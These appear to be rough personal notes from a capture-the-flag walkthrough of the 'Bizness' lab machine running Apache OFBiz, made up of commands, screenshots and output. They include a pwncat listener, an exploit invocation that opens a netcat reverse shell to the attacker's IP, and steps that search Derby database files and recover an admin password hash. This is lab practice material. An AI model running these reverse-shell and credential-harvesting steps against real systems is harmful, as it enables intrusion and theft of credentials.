

```
pwncat -l 9999 --self-inject /bin/bash:10.10.14.47:9999 -vv
```


```
python3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.47 7777'
```



![[Official monke-20240121224837352.webp|816]]




![[Official monke-20240121224851990.webp|714]]



![[Official monke-20240121224920903.webp|1084]]



`/op/ofbiz`


```
drwxr-xr-x 15 ofbiz ofbiz-operator  4096 Jan 21 07:59 .
drwxr-xr-x  3 root  root            4096 Dec 21 09:15 ..
-rw-r--r--  1 ofbiz ofbiz-operator  7136 Oct 13 12:04 APACHE2_HEADER
drwxr-xr-x 14 ofbiz ofbiz-operator  4096 Dec 21 09:15 applications
drwxr-xr-x 10 ofbiz ofbiz-operator  4096 Dec 21 09:15 build
-rw-r--r--  1 ofbiz ofbiz-operator 48733 Oct 13 12:04 build.gradle
-rw-r--r--  1 ofbiz ofbiz-operator  2492 Oct 13 12:04 common.gradle
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 config
drwxr-xr-x  4 ofbiz ofbiz-operator  4096 Dec 21 09:15 docker
-rw-r--r--  1 ofbiz ofbiz-operator  4980 Oct 13 12:04 Dockerfile
-rw-r--r--  1 ofbiz ofbiz-operator  9432 Oct 13 12:04 DOCKER.md
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 docs
drwxr-xr-x 19 ofbiz ofbiz-operator  4096 Jan 21 06:35 framework
-rw-r--r--  1 ofbiz ofbiz-operator   944 Oct 13 12:04 .gitattributes
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 .github
-rw-r--r--  1 ofbiz ofbiz-operator   643 Oct 13 12:04 .gitignore
drwxr-xr-x  5 ofbiz ofbiz-operator  4096 Dec 21 09:15 .gradle
drwxr-xr-x  3 ofbiz ofbiz-operator  4096 Dec 21 09:15 gradle
-rw-r--r--  1 ofbiz ofbiz-operator  1185 Oct 13 12:04 gradle.properties
-rwxr-xr-x  1 ofbiz ofbiz-operator  6134 Oct 13 12:04 gradlew
-rw-r--r--  1 ofbiz ofbiz-operator  3185 Oct 13 12:04 gradlew.bat
-rw-r--r--  1 ofbiz ofbiz-operator   278 Oct 13 12:04 .hgignore
-rwxr-xr-x  1 ofbiz ofbiz-operator  1246 Oct 13 12:04 init-gradle-wrapper.bat
-rw-r--r--  1 ofbiz ofbiz-operator  2672 Oct 13 12:04 INSTALL
drwxr-xr-x  2 ofbiz ofbiz-operator  4096 Dec 21 09:15 lib
-rw-r--r--  1 ofbiz ofbiz-operator 13324 Oct 29 07:47 LICENSE
-rw-r--r--  1 ofbiz ofbiz-operator   166 Oct 13 12:04 NOTICE
-rw-r--r--  1 ofbiz ofbiz-operator   145 Oct 13 12:04 npm-shrinkwrap.json
-rw-r--r--  1 ofbiz ofbiz-operator  1747 Oct 13 12:04 OPTIONAL_LIBRARIES
drwxr-xr-x 24 ofbiz ofbiz-operator  4096 Dec 21 09:15 plugins
-rw-r--r--  1 ofbiz ofbiz-operator 31656 Oct 13 12:04 README.adoc
drwxr-xr-x  9 ofbiz ofbiz-operator  4096 Dec 21 09:15 runtime
-rw-r--r--  1 ofbiz ofbiz-operator   893 Oct 13 12:04 SECURITY.md
-rw-r--r--  1 ofbiz ofbiz-operator  1246 Oct 13 12:04 settings.gradle
-rw-r--r--  1 ofbiz ofbiz-operator     9 Jan 21 07:59 test
drwxr-xr-x  7 ofbiz ofbiz-operator  4096 Dec 21 09:15 themes
-rw-r--r--  1 ofbiz ofbiz-operator     6 Oct 13 12:04 VERSION
-rw-r--r--  1 ofbiz ofbiz-operator  1969 Oct 13 12:04 .xmlcatalog.xml
```






![[Official monke-20240121224657045.webp|720]]

![[Official monke-20240121224744824.webp]]


```
ls
derby.log
ofbiz
ofbizolap
ofbiztenant
ls -la
total 24
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Dec 21 09:15 .
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
-rw-r--r-- 1 ofbiz ofbiz-operator 2320 Jan 21 13:15 derby.log
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan 21 13:15 ofbiz
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan 21 13:15 ofbizolap
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Jan 21 13:15 ofbiztenant
pwd
/opt/ofbiz/runtime/data/derby
tree
find type -d . seg0
find type -d -name seg0
find . typde -d -name seg0
./ofbiz/seg0
./ofbizolap/seg0
./ofbiztenant/seg0

```


https://search.brave.com/search?q=how+to+search+for+directory+using+find+ocmmand&source=desktop




```
python3 pattern-search.py
Enter direcotry to read all .dat files:/opt/ofbiz/runtime/data/derby/ofbiz/seg0
Pattern found in c54d0.dat
Pattern found in c6650.dat
```


```
cat c54d0.dat
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

```
cat c6650.dat
admin$"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN
```

